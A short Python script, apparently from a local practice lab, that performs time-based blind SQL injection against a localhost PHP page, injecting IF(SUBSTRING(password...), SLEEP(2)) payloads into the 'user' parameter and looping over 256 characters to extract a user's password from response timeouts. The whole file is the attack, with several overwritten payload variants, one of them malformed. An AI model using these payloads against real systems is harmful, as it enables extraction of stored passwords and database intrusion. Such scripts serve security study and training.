import requests

# The API endpoint
url1 = "http://localhost:8000/blindsqli.php?user=bob' and" \
       " SELECT IF(SUBSTRING(users.password,1,1) ='"
url2 = "',SLEEP(2),null) FROM users WHERE username = 'fredo'"\
       "  and '1'='1"

url1 = "http://localhost:8000/blindsqli.php?user=bob' AND " \
       "SUBSTRING((SELECT password FROM users WHERE username = 'fredo'), 1, 1)  'f'"

url1 = "http://localhost:8000/blindsqli.php?user=bob' and " \
       "if(SUBSTRING((SELECT password FROM users WHERE username = 'frodo'), 1, 1) = '"
url2 = "',sleep(2),null) and '1'='1"

# url = "http://localhost:8000/blindsqli.php?user=bob' and if(1=1, sleep(2), false) and '1'='1"
# url = "http://localhost:8000/blindsqli.php?user=bob"

for i in range(0, 256):

    # A GET request to the API
    try:
        response = requests.get(url1 + chr(i) + url2, timeout=2)

        # print(response)
    except Exception as e:
        print("timeout " + chr(i))
    # Print the response
    # response_json = response.json()
    # print(response_json)
